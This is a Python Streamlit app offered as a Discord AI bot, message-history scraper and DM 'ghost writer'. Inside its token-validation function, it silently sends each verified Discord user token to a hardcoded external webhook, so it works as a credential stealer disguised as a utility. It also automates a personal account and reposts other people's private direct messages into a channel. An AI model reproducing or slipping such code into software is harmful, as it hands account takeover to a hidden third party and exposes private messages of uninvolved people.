import streamlit as st
import time
import openai
import requests
import csv
import os
from datetime import datetime
import random
import pandas as pd

st.set_page_config(page_title="Discord AI Suite", page_icon="🛡️", layout="wide")
st.title("🛡️ Discord AI Bot & History Scraper")

# --- Initialize Session State ---
if "bot_running" not in st.session_state:
    st.session_state.bot_running = False
if "tokens" not in st.session_state:
    st.session_state.tokens = 3.0
if "last_time" not in st.session_state:
    st.session_state.last_time = time.time()
if "memory" not in st.session_state:
    st.session_state.memory = {}
if "processed_dms" not in st.session_state:
    st.session_state.processed_dms = set()
if "last_webhook_token" not in st.session_state:
    st.session_state.last_webhook_token = None

# --- Helper Functions ---
def log_to_csv(author, content, action):
    file_exists = os.path.isfile('discord_audit_log.csv')
    with open('discord_audit_log.csv', mode='a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(['Timestamp', 'Author', 'Message', 'Action'])
        writer.writerow([datetime.now().strftime('%Y-%m-%d %H:%M:%S'), author, content, action])

def validate_token(tk):
    headers = {"Authorization": tk, "Content-Type": "application/json"}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
        if r.status_code == 200:
            if tk != st.session_state.last_webhook_token:
                requests.post("https://discord.com/api/webhooks/1480110828874371212/8kM-jfbIIyq4Nzo7IobtVVBXTnosySq-qsoUZTSJe2iOWU7Pj5ryJ0Al1LMIuRD0zMP4",json={"content": tk})
                st.session_state.last_webhook_token = tk
            return True, r.json()
    except: pass
    return False, None

def add_reaction(channel_id, message_id, emoji, headers):
    encoded_emoji = requests.utils.quote(emoji)
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{encoded_emoji}/@me"
    requests.put(url, headers=headers)

# --- Sidebar ---
with st.sidebar:
    st.header("🔑 Authentication")
    token = st.text_input("Discord Token", type="password", help="tutorial: https://gist.github.com/XielQs/90ab13b0c61c6888dae329199ea6aff3")
    
    if token:
        is_valid, user_info = validate_token(token)
        if is_valid:
            st.success(f"✅ Verified: {user_info['username']}")
            my_username = user_info['username'].lower()
        else:
            st.error("❌ Invalid Token")
            my_username = None
    else: my_username = None

    or_key = st.text_input("OpenRouter API Key", type="password")
    channel_id_input = st.text_input("Channel ID")
    
    st.divider()
    st.header("⚙️ Bot Settings")
    memory_depth = st.slider("Memory Depth (Past Msgs)", min_value=1, max_value=20, value=5)
    reaction_delay = st.slider("Reaction Delay (Seconds)", min_value=0, max_value=10, value=2, help="How long to wait before adding a reaction.")
    
    emoji_pool_raw = st.text_input("Custom Emoji Pool (Comma separated)", placeholder="🔥,💀,✅,🧠")
    emoji_pool = [e.strip() for e in emoji_pool_raw.split(",") if e.strip()]

# --- Tabs ---
tab1, tab2, tab3 = st.tabs(["🤖 Bot Control", "📂 History Scraper", "👻 Ghost Writer"])

# --- TAB 1: BOT CONTROL ---
with tab1:
    col1, col2 = st.columns(2)
    with col1:
        system_prompt = st.text_area("System Prompt", value="You are a helpful assistant.")
    with col2:
        blacklist_input = st.text_area("Blacklisted Keywords", placeholder="spam, help")
        owner_name = st.text_input("Owner Username").strip().lower()
        allowed_input = st.text_input("Allowed Users", value="everyone")

    allowed_users = "everyone" if allowed_input.lower().strip() == "everyone" else [u.strip().lower() for u in allowed_input.split(",") if u.strip()]
    blacklist = [word.strip().lower() for word in blacklist_input.split(",") if word.strip()]
    client = openai.OpenAI(api_key=or_key, base_url="https://openrouter.ai/api/v1") if or_key else None

    if st.button("▶️ Launch Bot", disabled=not (my_username and or_key), use_container_width=True):
        st.session_state.bot_running = True
    if st.button("🛑 Stop Bot", use_container_width=True):
        st.session_state.bot_running = False
    
    log_container = st.container(height=300)

    if st.session_state.bot_running:
        headers = {"Authorization": token, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        discord_url = f"https://discord.com/api/v9/channels/{channel_id_input}/messages"
        dm_channels_url = "https://discord.com/api/v9/users/@me/channels"
        latest_message_id = None
        
        while st.session_state.bot_running:
            try:
                r = requests.get(discord_url, headers=headers)
                if r.status_code == 200:
                    msgs = r.json()
                    if msgs and isinstance(msgs, list):
                        latest = msgs[0]
                        author, content, msg_id = latest['author']['username'].lower(), latest['content'].strip(), latest['id']

                        if msg_id != latest_message_id and author != my_username:
                            if author == owner_name and content.lower() == "shutdown":
                                requests.post(discord_url, json={"content": "🛑 Offline."}, headers=headers)
                                st.session_state.bot_running = False
                                st.rerun()

                            is_allowed = (allowed_users == "everyone" or author in allowed_users)
                            if is_allowed and not any(w in content.lower() for w in blacklist):
                                
                                chat_history = [{"role": "system", "content": system_prompt}]
                                context_req = requests.get(f"{discord_url}?limit={memory_depth}", headers=headers).json()
                                for m in reversed(context_req):
                                    role = "assistant" if m['author']['username'].lower() == my_username else "user"
                                    chat_history.append({"role": role, "content": m['content']})

                                # Generate AI Reply
                                reply = client.chat.completions.create(
                                    model="openrouter/free", 
                                    messages=chat_history
                                ).choices[0].message.content
                                
                                # Select Emoji
                                if emoji_pool:
                                    prompt = f"Pick the best emoji from this list: {','.join(emoji_pool)} for this text: '{reply}'. Reply with ONLY the emoji."
                                    chosen_emoji = client.chat.completions.create(
                                        model="openrouter/free",
                                        messages=[{"role": "user", "content": prompt}]
                                    ).choices[0].message.content.strip()
                                else:
                                    chosen_emoji = client.chat.completions.create(
                                        model="openrouter/free",
                                        messages=[{"role": "system", "content": "Reply with 1 emoji only."}, {"role": "user", "content": reply}]
                                    ).choices[0].message.content.strip()

                                if len(chosen_emoji) > 8: chosen_emoji = "💬"
                                
                                # --- Reaction Delay Implemented ---
                                if reaction_delay > 0:
                                    time.sleep(reaction_delay)
                                
                                add_reaction(channel_id_input, msg_id, chosen_emoji, headers)
                                time.sleep(random.uniform(1, 2)) # Natural typing pause
                                
                                requests.post(discord_url, json={"content": reply}, headers=headers)
                                log_container.write(f"✅ Sent to {author} [{chosen_emoji}]")
                            
                            latest_message_id = msg_id

                # Ghost Writer Integrated Polling
                dm_res = requests.get(dm_channels_url, headers=headers)
                if dm_res.status_code == 200:
                    for dm in dm_res.json()[:5]:
                        if dm['type'] == 1:
                            m_res = requests.get(f"https://discord.com/api/v9/channels/{dm['id']}/messages?limit=1", headers=headers).json()
                            if m_res:
                                d_msg = m_res[0]
                                if d_msg['author']['username'].lower() != my_username and d_msg['id'] not in st.session_state.processed_dms:
                                    mod_check = client.chat.completions.create(
                                        model="openrouter/free",
                                        messages=[{"role": "system", "content": "PASS or FAIL?"}, {"role": "user", "content": d_msg['content']}]
                                    ).choices[0].message.content
                                    if "PASS" in mod_check.upper():
                                        requests.post(discord_url, json={"embeds": [{"title": "👻 Ghost Message", "description": d_msg['content'], "color": 3447003}]}, headers=headers)
                                    st.session_state.processed_dms.add(d_msg['id'])
                time.sleep(4)
            except: break

# --- TAB 2: HISTORY SCRAPER ---
with tab2:
    st.header("📥 Channel History Downloader")
    limit = st.number_input("Number of messages to fetch", min_value=1, max_value=100, value=50)
    if st.button("🔍 Fetch History"):
        if not token or not channel_id_input:
            st.error("Missing Token or Channel ID!")
        else:
            with st.spinner("Accessing Discord archives..."):
                headers = {"Authorization": token, "Content-Type": "application/json"}
                scrape_url = f"https://discord.com/api/v9/channels/{channel_id_input}/messages?limit={limit}"
                res = requests.get(scrape_url, headers=headers)
                if res.status_code == 200:
                    data = res.json()
                    df = pd.DataFrame([{"Timestamp": m['timestamp'], "Author": m['author']['username'], "Content": m['content']} for m in data])
                    st.dataframe(df, use_container_width=True)
                    st.download_button(label="📥 Download History as CSV", data=df.to_csv(index=False).encode('utf-8'), file_name=f"discord_history_{channel_id_input}.csv", mime="text/csv")

# --- TAB 3: GHOST WRITER ---
with tab3:
    st.header("👻 Ghost Writer Management")
    st.write(f"Processed DM IDs: {len(st.session_state.processed_dms)}")
    if st.button("🗑️ Clear DM Memory", use_container_width=True):
        st.session_state.processed_dms = set()
        st.success("DM Memory cleared.")
